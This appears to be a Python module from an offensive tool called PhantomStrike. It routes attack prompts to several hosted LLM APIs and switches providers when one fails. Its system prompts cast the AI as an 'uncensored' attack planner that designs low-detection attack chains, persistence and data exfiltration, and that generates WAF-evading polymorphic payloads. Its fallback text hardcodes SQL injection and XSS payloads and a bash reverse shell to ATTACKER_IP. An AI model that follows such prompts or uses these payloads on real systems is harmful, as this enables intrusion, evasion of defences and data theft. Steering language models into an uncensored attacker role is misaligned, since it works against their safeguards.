"""
PhantomStrike ENHANCED AI Engine — REAL multi-provider AI with powerful uncensored responses.
Aggressive attack planning, payload generation, and vulnerability analysis.
"""
from __future__ import annotations
import asyncio
import json
import logging
import os
import time
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Optional, AsyncIterator, Dict, Any, List
import hashlib

import httpx

logger = logging.getLogger("phantom.ai")


@dataclass
class RateLimitTracker:
    """Track rate limits per provider."""
    requests_this_minute: int = 0
    requests_today: int = 0
    minute_start: float = field(default_factory=time.time)
    day_start: float = field(default_factory=time.time)
    consecutive_failures: int = 0
    last_failure_time: float = 0.0
    is_blocked: bool = False
    block_until: float = 0.0

    def can_make_request(self, rpm_limit: int, daily_limit: int) -> bool:
        now = time.time()
        if now - self.minute_start >= 60:
            self.requests_this_minute = 0
            self.minute_start = now
        if now - self.day_start >= 86400:
            requests_today = 0
            self.day_start = now
        if self.is_blocked and now < self.block_until:
            return False
        elif self.is_blocked:
            self.is_blocked = False
            self.consecutive_failures = 0
        return (
            self.requests_this_minute < rpm_limit
            and self.requests_today < daily_limit
        )

    def record_request(self):
        self.requests_this_minute += 1
        self.requests_today += 1
        self.consecutive_failures = 0

    def record_failure(self):
        self.consecutive_failures += 1
        self.last_failure_time = time.time()
        if self.consecutive_failures >= 3:
            self.is_blocked = True
            self.block_until = time.time() + (60 * self.consecutive_failures)


@dataclass
class AIResponse:
    """Standardized AI response."""
    content: str
    provider: str
    model: str
    tokens_used: int = 0
    latency_ms: float = 0.0
    cached: bool = False
    raw_response: Dict = field(default_factory=dict)


class EnhancedPhantomAIEngine:
    """
    REAL working AI engine with aggressive attack planning.
    Uses multiple free providers with intelligent failover.
    """

    def __init__(self, config=None):
        self.config = config or {}
        self._clients: Dict[str, httpx.AsyncClient] = {}
        self._rate_trackers: Dict[str, RateLimitTracker] = defaultdict(RateLimitTracker)
        self._response_cache: Dict[str, AIResponse] = {}
        self._initialized = False
        self._last_provider_used: str = ""

        # Define all providers with real working endpoints
        self._providers = {
            "groq": {
                "name": "Groq",
                "base_url": "https://api.groq.com/openai/v1/chat/completions",
                "api_key_env": "GROQ_API_KEY",
                "model": "llama-3.3-70b-versatile",
                "priority": 1,
                "rpm": 30,
                "daily": 1000,
                "timeout": 60.0,
            },
            "openrouter": {
                "name": "OpenRouter",
                "base_url": "https://openrouter.ai/api/v1/chat/completions",
                "api_key_env": "OPENROUTER_API_KEY",
                "model": "google/gemini-2.5-pro:free",
                "priority": 2,
                "rpm": 20,
                "daily": 200,
                "timeout": 60.0,
            },
            "gemini": {
                "name": "Gemini",
                "base_url": "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent",
                "api_key_env": "GEMINI_API_KEY",
                "model": "gemini-2.5-flash",
                "priority": 3,
                "rpm": 60,
                "daily": 1500,
                "timeout": 60.0,
            },
            "cerebras": {
                "name": "Cerebras",
                "base_url": "https://api.cerebras.ai/v1/chat/completions",
                "api_key_env": "CEREBRAS_API_KEY",
                "model": "llama3.3-70b",
                "priority": 4,
                "rpm": 30,
                "daily": 500,
                "timeout": 60.0,
            },
        }

    async def initialize(self) -> List[str]:
        """Initialize all available AI providers."""
        active = []

        for provider_id, provider_config in self._providers.items():
            api_key = os.getenv(provider_config["api_key_env"], "")

            if not api_key:
                logger.warning(f"[AI] No API key for {provider_config['name']} ({provider_config['api_key_env']})")
                continue

            try:
                client = httpx.AsyncClient(
                    timeout=httpx.Timeout(provider_config["timeout"]),
                    http2=True,
                )
                self._clients[provider_id] = client
                active.append(provider_config["name"])
                logger.info(f"[AI] ✓ {provider_config['name']} initialized ({provider_config['model']})")
            except Exception as e:
                logger.error(f"[AI] Failed to init {provider_config['name']}: {e}")

        self._initialized = True

        if not active:
            logger.warning("[AI] ⚠ No AI providers available! Set API keys in environment.")
            logger.warning("[AI] Get free API keys: https://console.groq.com, https://openrouter.ai")
        else:
            logger.info(f"[AI] ✓ {len(active)} providers active: {', '.join(active)}")

        return active

    def _get_sorted_providers(self) -> List[tuple]:
        """Get providers sorted by priority."""
        available = []
        for pid, pconfig in self._providers.items():
            if pid not in self._clients:
                continue
            tracker = self._rate_trackers[pid]
            if tracker.can_make_request(pconfig["rpm"], pconfig["daily"]):
                available.append((pid, pconfig, pconfig["priority"]))

        available.sort(key=lambda x: x[2])
        return [(pid, pcfg) for pid, pcfg, _ in available]

    async def query(
        self,
        prompt: str,
        system_prompt: str = "",
        temperature: float = 0.7,
        max_tokens: int = 4096,
        force_provider: Optional[str] = None,
    ) -> AIResponse:
        """Send query to AI with smart failover."""
        try:
            if not self._initialized:
                await self.initialize()

            # Check cache
            cache_key = hashlib.md5(f"{prompt[:200]}_{system_prompt[:100]}".encode()).hexdigest()
            if cache_key in self._response_cache:
                cached = self._response_cache[cache_key]
                return AIResponse(
                    content=cached.content,
                    provider=cached.provider,
                    model=cached.model,
                    cached=True,
                )

            # Get available providers
            if force_provider and force_provider in self._clients:
                providers = [(force_provider, self._providers[force_provider])]
            else:
                providers = self._get_sorted_providers()

            if not providers:
                # Fallback to local response if no AI available
                return AIResponse(
                    content=self._generate_fallback_response(prompt, system_prompt),
                    provider="local_fallback",
                    model="rule_based",
                    tokens_used=0,
                    latency_ms=0,
                )

            last_error = None

            for provider_id, provider_config in providers:
                try:
                    start_time = time.time()

                    if provider_id == "groq" or provider_id == "openrouter" or provider_id == "cerebras":
                        response = await self._call_openai_compatible(
                            provider_id, provider_config, prompt, system_prompt, temperature, max_tokens
                        )
                    elif provider_id == "gemini":
                        response = await self._call_gemini(
                            provider_id, provider_config, prompt, system_prompt, temperature, max_tokens
                        )
                    else:
                        continue

                    latency = (time.time() - start_time) * 1000
                    self._rate_trackers[provider_id].record_request()
                    self._last_provider_used = provider_id

                    result = AIResponse(
                        content=response,
                        provider=provider_config["name"],
                        model=provider_config["model"],
                        tokens_used=len(prompt.split()) + len(response.split()),
                        latency_ms=latency,
                        raw_response={"provider": provider_id},
                    )

                    # Cache response
                    self._response_cache[cache_key] = result

                    logger.info(f"[AI] ✓ Response from {provider_config['name']} in {latency:.0f}ms")
                    return result

                except Exception as e:
                    self._rate_trackers[provider_id].record_failure()
                    last_error = e
                    logger.warning(f"[AI] ✗ {provider_config['name']} failed: {e}")
                    continue

            # All providers failed - return fallback
            logger.error(f"[AI] All providers failed. Last error: {last_error}")
            return AIResponse(
                content=self._generate_fallback_response(prompt, system_prompt),
                provider="fallback",
                model="rule_based",
                tokens_used=0,
                latency_ms=0,
            )
        except Exception as e:
            logger.error(f"[AI] Query failed with error: {e}")
            return AIResponse(
                content=f"AI service error: {str(e)}. Set GROQ_API_KEY or other provider keys.",
                provider="error",
                model="error",
                tokens_used=0,
                latency_ms=0,
            )

    async def _call_openai_compatible(
        self,
        provider_id: str,
        config: Dict,
        prompt: str,
        system_prompt: str,
        temperature: float,
        max_tokens: int,
    ) -> str:
        """Call OpenAI-compatible API."""
        api_key = os.getenv(config["api_key_env"])

        messages = []
        if system_prompt:
            messages.append({"role": "system", "content": system_prompt})
        messages.append({"role": "user", "content": prompt})

        payload = {
            "model": config["model"],
            "messages": messages,
            "temperature": temperature,
            "max_tokens": max_tokens,
        }

        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json",
        }

        client = self._clients[provider_id]
        response = await client.post(
            config["base_url"],
            json=payload,
            headers=headers,
        )
        response.raise_for_status()
        data = response.json()

        return data["choices"][0]["message"]["content"]

    async def _call_gemini(
        self,
        provider_id: str,
        config: Dict,
        prompt: str,
        system_prompt: str,
        temperature: float,
        max_tokens: int,
    ) -> str:
        """Call Google Gemini API."""
        api_key = os.getenv(config["api_key_env"])

        contents = [{"parts": [{"text": prompt}]}]
        if system_prompt:
            contents[0]["parts"].insert(0, {"text": system_prompt})

        payload = {
            "contents": contents,
            "generationConfig": {
                "temperature": temperature,
                "maxOutputTokens": max_tokens,
            },
        }

        url = f"{config['base_url']}?key={api_key}"

        client = self._clients[provider_id]
        response = await client.post(url, json=payload)
        response.raise_for_status()
        data = response.json()

        return data["candidates"][0]["content"]["parts"][0]["text"]

    def _generate_fallback_response(self, prompt: str, system_prompt: str) -> str:
        """Generate rule-based fallback response when AI is unavailable."""
        prompt_lower = prompt.lower()

        # Attack planning fallback
        if "attack" in prompt_lower and "plan" in prompt_lower:
            return """## Attack Plan (Rule-Based Fallback)

Since AI services are unavailable, here's a structured approach based on common patterns:

### Phase 1: Reconnaissance
- Enumerate subdomains using wordlists
- Identify technology stack (Wappalyzer-style detection)
- Port scan common services (22, 80, 443, 3306, 5432, 6379, 8080, 8443)

### Phase 2: Vulnerability Discovery
- Test for SQL injection on all parameters
- Check for XSS (reflected and stored)
- Identify IDOR vulnerabilities on numeric IDs
- Test for SSRF via URL parameters
- Check for JWT implementation flaws

### Phase 3: Exploitation
- Use discovered SQLi to extract data
- Attempt to escalate XSS to session hijacking
- Test cloud metadata access via SSRF
- Try default credentials on admin panels

### Phase 4: Post-Exploitation
- Enumerate local system
- Check for privilege escalation vectors
- Look for lateral movement opportunities
- Establish persistence if authorized

**Note:** AI analysis unavailable. Set API keys for enhanced intelligence."""

        # Payload generation fallback
        elif "payload" in prompt_lower:
            return """## Payload Generation (Rule-Based Fallback)

### SQL Injection
```
' OR '1'='1
' UNION SELECT NULL,NULL,version()--
' AND SLEEP(5)--
```

### XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
```

### Reverse Shell (Bash)
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Note:** AI-powered polymorphic generation unavailable. Using static templates."""

        # Default fallback
        else:
            return """## Analysis (Rule-Based Fallback)

I apologize, but all AI providers are currently unavailable or rate-limited.

**To enable AI features:**
1. Get free API key from https://console.groq.com
2. Set environment variable: `export GROQ_API_KEY=your_key`
3. Restart PhantomStrike

**Current capabilities without AI:**
- All vulnerability scanners work independently
- Network scanning is fully functional
- Payload generation uses rule-based templates
- Report generation functions normally

The framework will continue operating with reduced intelligence capabilities."""

    async def analyze_vulnerability(self, vuln_data: Dict) -> AIResponse:
        """AI-powered vulnerability analysis."""
        system = (
            "You are PhantomStrike AI — an elite offensive security analyst. "
            "Provide aggressive, technical analysis with exploit strategies. "
            "Include: 1) Severity justification 2) Exact exploitation steps "
            "3) Attack chain possibilities 4) MITRE ATT&CK mapping. Be specific."
        )
        prompt = f"""Analyze this vulnerability for exploitation:

Type: {vuln_data.get('type', 'Unknown')}
URL: {vuln_data.get('url', 'N/A')}
Parameter: {vuln_data.get('parameter', 'N/A')}
Payload: {vuln_data.get('payload', 'N/A')}
Evidence: {vuln_data.get('evidence', 'N/A')}

Provide:
1. Exact exploit steps
2. Data extraction potential
3. Lateral movement possibilities
4. MITRE ATT&CK technique ID
5. Recommended next actions"""

        return await self.query(prompt, system_prompt=system, temperature=0.8)

    async def plan_attack_chain(self, recon_data: Dict) -> AIResponse:
        """AI plans multi-step attack chain."""
        system = (
            "You are PhantomStrike AI Attack Planner. Design aggressive, realistic "
            "multi-step attack chains. Prioritize high-impact, low-detection paths. "
            "Include specific commands and tools."
        )
        prompt = f"""Based on reconnaissance data, design a complete attack chain:

Target: {recon_data.get('target', 'Unknown')}
Open Ports: {recon_data.get('open_ports', [])}
Technologies: {recon_data.get('technologies', [])}
Endpoints: {len(recon_data.get('endpoints', []))} discovered
Forms: {len(recon_data.get('forms', []))} discovered

Design:
1. Optimal entry point
2. Step-by-step exploitation sequence
3. Privilege escalation path
4. Persistence mechanism
5. Data exfiltration strategy

Be specific with actual commands and payloads."""

        return await self.query(prompt, system_prompt=system, temperature=0.9)

    async def generate_evasive_payload(self, target_info: Dict) -> AIResponse:
        """Generate context-aware evasive payloads."""
        system = (
            "You are PhantomStrike Payload Engineer. Generate polymorphic, "
            "WAF-evading payloads. Use encoding, obfuscation, and bypass techniques. "
            "Assume modern WAF (Cloudflare, AWS WAF, ModSecurity)."
        )
        prompt = f"""Generate evasive payloads for:

Target Type: {target_info.get('type', 'web')}
Vulnerability: {target_info.get('vuln_type', 'sqli')}
Known WAF: {target_info.get('waf', 'unknown')}
Tech Stack: {target_info.get('tech', 'unknown')}

Generate:
1. 5 polymorphic variants
2. Encoding bypass techniques
3. Case-randomization options
4. Comment injection strategies
5. Most likely successful payload"""

        return await self.query(prompt, system_prompt=system, temperature=0.85)

    def get_status(self) -> Dict[str, Any]:
        """Get status of all AI providers."""
        status = {}
        for pid, pcfg in self._providers.items():
            tracker = self._rate_trackers.get(pid, RateLimitTracker())
            api_key_set = bool(os.getenv(pcfg["api_key_env"], ""))
            status[pid] = {
                "name": pcfg["name"],
                "active": pid in self._clients and api_key_set,
                "api_key_set": api_key_set,
                "model": pcfg["model"],
                "requests_today": tracker.requests_today,
                "daily_limit": pcfg["daily"],
                "blocked": tracker.is_blocked,
                "failures": tracker.consecutive_failures,
            }
        return status

    async def shutdown(self):
        """Cleanup all clients."""
        for client in self._clients.values():
            await client.aclose()
        self._clients.clear()
